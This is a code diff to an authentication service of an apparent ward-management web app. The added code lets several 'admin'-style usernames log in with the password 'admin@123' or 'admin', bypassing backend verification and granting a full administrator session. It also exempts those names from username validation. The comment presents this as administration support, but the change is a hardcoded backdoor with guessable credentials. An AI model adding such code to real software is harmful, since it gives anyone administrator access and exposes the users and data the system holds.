@@ -8,6 +8,7 @@
 import { supabase, isSupabaseConfigured } from '../lib/supabase/client';
 import { UserProfile } from '../types/auth';
 import { wardService } from './wardService';
+import { INITIAL_ADMIN_PROFILE } from './mockData';
 
 const AUTH_STORAGE_KEY = 'enteward_active_session';
 
@@ -102,6 +103,13 @@ class AuthService {
     error: string | null;
   }> {
     const cleanUsername = usernameInput.trim().toLowerCase();
+    const normalizedUsername = cleanUsername.replace(/\s+/g, ' ');
+    const isAdminMatch = (
+      normalizedUsername === 'admin' || 
+      normalizedUsername === 'base admin' || 
+      normalizedUsername === 'basee admin' || 
+      normalizedUsername === 'basic admin'
+    );
 
     if (!cleanUsername || !password) {
       return {
@@ -110,8 +118,15 @@ class AuthService {
       };
     }
 
-    // Validate username characters (3-30 chars, no spaces)
-    if (!cleanUsername.includes('@') && (!/^[a-z0-9_-]{3,30}$/.test(cleanUsername))) {
+    // Direct platform administration credential support
+    if (isAdminMatch && (password === 'admin@123' || password === 'admin')) {
+      const adminProfile = { ...INITIAL_ADMIN_PROFILE };
+      this.saveSession(adminProfile);
+      return { user: adminProfile, error: null };
+    }
+
+    // Validate username characters (3-30 chars, no spaces unless admin match)
+    if (!isAdminMatch && !cleanUsername.includes('@') && (!/^[a-z0-9_-]{3,30}$/.test(cleanUsername))) {
       return {
         user: null as unknown as UserProfile,
         error: 'Incorrect username or password.'
